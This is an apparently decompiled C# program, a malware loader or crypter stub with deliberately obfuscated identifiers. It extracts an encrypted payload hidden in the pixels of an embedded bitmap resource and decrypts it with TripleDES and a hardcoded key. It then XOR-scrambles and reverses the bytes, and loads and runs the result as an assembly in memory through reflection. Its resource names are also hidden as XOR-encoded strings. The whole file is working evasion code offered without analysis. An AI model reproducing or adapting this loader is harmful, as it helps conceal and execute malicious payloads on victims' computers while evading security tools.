using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;

namespace GKgPpKHvtGsTwIihwWyhEfVTOJAHFIdhDTzNpDMcNrwNjnYPRqGZrTcnCAqluqObEVLvWpuhWNjmsBfpVwsDLUsopIrmSUhN;

internal static class OvxUvixXmtzfVdBvJvzGVTCAPfYzIRXPltIQYRQYKLyEz
{
	private static byte[] BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS = new byte[24]
	{
		135, 3, 100, 21, 133, 62, 178, 110, 110, 69,
		240, 75, 32, 129, 2, 118, 197, 174, 190, 55,
		133, 74, 74, 29
	};

	private static void Main(string[] args)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(0);
		ResourceManager resourceManager = BcSxXgMJZzOFjecrkABjXEJHkpdZjvuMxkmIbgQESRZnASmCeGJzwdYxZVeSwymoMOyNRGZepxZkVkz();
		Bitmap val = (Bitmap)resourceManager.GetObject(cxdYeBgsdrpmbEzFLazLfVdPzxqXyIGTnlQYEiusQHWYjQGrr("+Nz6yefu7vj3y+/H1Mg=", BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS));
		BitmapData val2 = val.LockBits(DkEEZqNonteWdHQkrbmwlWkgpGCUIEnfKcwAKBENAsmnSrJxYffmLtgoMflKtlQVUH(val), (ImageLockMode)1, ((Image)val).get_PixelFormat());
		byte[] array = new byte[4 * ((Image)val).get_Width() * ((Image)val).get_Height()];
		((Image)val).get_PixelFormat();
		Marshal.Copy(val2.get_Scan0(), array, 0, array.Length);
		byte[] array2 = new byte[BitConverter.ToInt32(array, 0)];
		Array.Copy(array, 4, array2, 0, array2.Length);
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS;
		ICryptoTransform bKWekYaYMljdXJjwPvMOCjZveqVomzExULgBlfbekXNeWnuRnyctXTNMdzMkVwxYJCUeWlOcMBjwlEXTXyPuAbmeYh = tripleDESCryptoServiceProvider.CreateDecryptor();
		array2 = LFJmuXQjuwYRzBWDyhMxFiYARTAXkARKCyqIeFiTlFiiuAfXRZuUIcBOXuVWpZNvbwISVYPZ(bKWekYaYMljdXJjwPvMOCjZveqVomzExULgBlfbekXNeWnuRnyctXTNMdzMkVwxYJCUeWlOcMBjwlEXTXyPuAbmeYh, array2);
		for (int i = 0; i < array2.Length; i++)
		{
			for (int j = 0; j < BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS.Length; j++)
			{
				array2[i] = QeMMDTYkJjSTVaQvkDVKZxDG(array2[i], BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS[j]);
			}
		}
		array2 = DteENPVQndyBPoErayhdLQKigTiFGEqhsgemJGKIHrnBimOTyGcqbWYpfCfyEpDVdrSxzedcEI(array2);
		Type typeFromHandle = typeof(Assembly);
		MethodInfo methodInfo = typeFromHandle.GetMethods()[39];
		Assembly assembly = (Assembly)methodInfo.Invoke(null, new object[1] { array2 });
		MethodInfo entryPoint = assembly.EntryPoint;
		entryPoint.Invoke(null, new object[1] { args });
	}

	private static string cxdYeBgsdrpmbEzFLazLfVdPzxqXyIGTnlQYEiusQHWYjQGrr(string xduydaPSfkyFeLzAazXJfLoMLVAMEcJv, byte[] fBNzEwEHWhbUdvdEnAcFtMxtiQjmPpLWBKBXuTIrlqSESyZmnbtAxOKzEXNwArulbCOcnkvYrkxrfKyGXJqstiugMLkdUU)
	{
		byte[] array = Convert.FromBase64String(xduydaPSfkyFeLzAazXJfLoMLVAMEcJv);
		for (int i = 0; i < array.Length; i++)
		{
			for (int j = 0; j < fBNzEwEHWhbUdvdEnAcFtMxtiQjmPpLWBKBXuTIrlqSESyZmnbtAxOKzEXNwArulbCOcnkvYrkxrfKyGXJqstiugMLkdUU.Length; j++)
			{
				array[i] = (byte)(array[i] ^ fBNzEwEHWhbUdvdEnAcFtMxtiQjmPpLWBKBXuTIrlqSESyZmnbtAxOKzEXNwArulbCOcnkvYrkxrfKyGXJqstiugMLkdUU[j]);
			}
		}
		string text = "";
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			text += (char)b;
		}
		return text;
	}

	private static ResourceManager BcSxXgMJZzOFjecrkABjXEJHkpdZjvuMxkmIbgQESRZnASmCeGJzwdYxZVeSwymoMOyNRGZepxZkVkz()
	{
		Type typeFromHandle = typeof(ResourceManager);
		ConstructorInfo constructor = typeFromHandle.GetConstructor(new Type[2]
		{
			typeof(string),
			typeof(Assembly)
		});
		return (ResourceManager)constructor.Invoke(BindingFlags.CreateInstance, null, new object[2]
		{
			cxdYeBgsdrpmbEzFLazLfVdPzxqXyIGTnlQYEiusQHWYjQGrr("zN/n7+Hc+vzI+sX3/O/0x8X8yQ==", BxgFlAMTcNPRlqxDgPfkyEYyfIfAppzIUrGiPtaHHgGwooHqFBQMdZpxQXmS),
			typeof(OvxUvixXmtzfVdBvJvzGVTCAPfYzIRXPltIQYRQYKLyEz).Assembly
		}, null);
	}

	private static Rectangle DkEEZqNonteWdHQkrbmwlWkgpGCUIEnfKcwAKBENAsmnSrJxYffmLtgoMflKtlQVUH(Bitmap xiNDlLVMpovEtMRatbHqtUsdyHoWRzpbcYrVrOirgYIBNISdyMHgmoDUVDyRPxvrNMisVUicjDSsNgfDrCoR)
	{
		return new Rectangle(0, 0, ((Image)xiNDlLVMpovEtMRatbHqtUsdyHoWRzpbcYrVrOirgYIBNISdyMHgmoDUVDyRPxvrNMisVUicjDSsNgfDrCoR).get_Width(), ((Image)xiNDlLVMpovEtMRatbHqtUsdyHoWRzpbcYrVrOirgYIBNISdyMHgmoDUVDyRPxvrNMisVUicjDSsNgfDrCoR).get_Height());
	}

	private static byte[] LFJmuXQjuwYRzBWDyhMxFiYARTAXkARKCyqIeFiTlFiiuAfXRZuUIcBOXuVWpZNvbwISVYPZ(ICryptoTransform bKWekYaYMljdXJjwPvMOCjZveqVomzExULgBlfbekXNeWnuRnyctXTNMdzMkVwxYJCUeWlOcMBjwlEXTXyPuAbmeYh, byte[] NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq)
	{
		return bKWekYaYMljdXJjwPvMOCjZveqVomzExULgBlfbekXNeWnuRnyctXTNMdzMkVwxYJCUeWlOcMBjwlEXTXyPuAbmeYh.TransformFinalBlock(NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq, 0, NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq.Length);
	}

	private static byte QeMMDTYkJjSTVaQvkDVKZxDG(byte sYhpFPazdINkbZObZye, byte vXltHAaqiqsIegGKSWauYeXfjGxvZMadbNzoXDRrAJY)
	{
		return (byte)(sYhpFPazdINkbZObZye ^ vXltHAaqiqsIegGKSWauYeXfjGxvZMadbNzoXDRrAJY);
	}

	private static byte[] DteENPVQndyBPoErayhdLQKigTiFGEqhsgemJGKIHrnBimOTyGcqbWYpfCfyEpDVdrSxzedcEI(byte[] NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq)
	{
		Array.Reverse((Array)NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq);
		return NYTidkpmgxAmRttaOvZCiiHhJwAmxthqBvdOyMUSZtxq;
	}
}
